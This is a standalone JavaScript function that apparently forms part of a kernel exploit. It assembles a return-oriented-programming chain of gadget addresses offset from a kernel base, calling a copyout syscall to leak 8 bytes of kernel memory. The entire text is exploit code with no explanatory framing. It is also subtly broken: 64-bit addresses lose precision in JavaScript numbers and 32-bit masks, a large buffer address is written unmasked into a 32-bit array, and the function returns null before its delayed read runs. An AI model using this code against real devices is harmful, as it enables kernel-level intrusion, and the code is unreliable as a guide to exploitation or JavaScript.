function read64(addr) {
  ropChain = new Uint32Array(0x400);
  let i = 0;

  const LIBKERNEL_BASE = 0xFFFFFFFF82600000;

  const GADGET_POP_X0 = LIBKERNEL_BASE + 0x1A2FFC;
  const GADGET_POP_X1 = LIBKERNEL_BASE + 0x1A3020;
  const GADGET_POP_X2 = LIBKERNEL_BASE + 0x1A3040;
  const GADGET_POP_X3 = LIBKERNEL_BASE + 0x1A3060;
  const GADGET_SYSCALL = LIBKERNEL_BASE + 0x1A2F28;

  const SYSCALL_COPYOUT = 0x3B;
  const USER_BUF_ADDR = 0x133713370300; // Must match ROP heap offset

  // Step 1: syscall number
  ropChain[i++] = GADGET_POP_X0 & 0xFFFFFFFF;
  ropChain[i++] = SYSCALL_COPYOUT;

  // Step 2: x1 = kernel src address
  ropChain[i++] = GADGET_POP_X1 & 0xFFFFFFFF;
  ropChain[i++] = addr & 0xFFFFFFFF;

  // Step 3: x2 = user dst
  ropChain[i++] = GADGET_POP_X2 & 0xFFFFFFFF;
  ropChain[i++] = USER_BUF_ADDR;

  // Step 4: x3 = size = 8
  ropChain[i++] = GADGET_POP_X3 & 0xFFFFFFFF;
  ropChain[i++] = 8;

  ropChain[i++] = GADGET_SYSCALL & 0xFFFFFFFF;

  debug_log("read64() syscall chain initialized for addr: 0x" + addr.toString(16));

  // Wait 300ms for ROP to run, then read buffer
  let result = null;
  const view = new DataView(read_target.buffer);
  setTimeout(() => {
    const lo = view.getUint32(0, true);
    const hi = view.getUint32(4, true);
    result = (BigInt(hi) << 32n) | BigInt(lo);
    debug_log("read64 result: 0x" + result.toString(16));
  }, 300);

  return result;
}
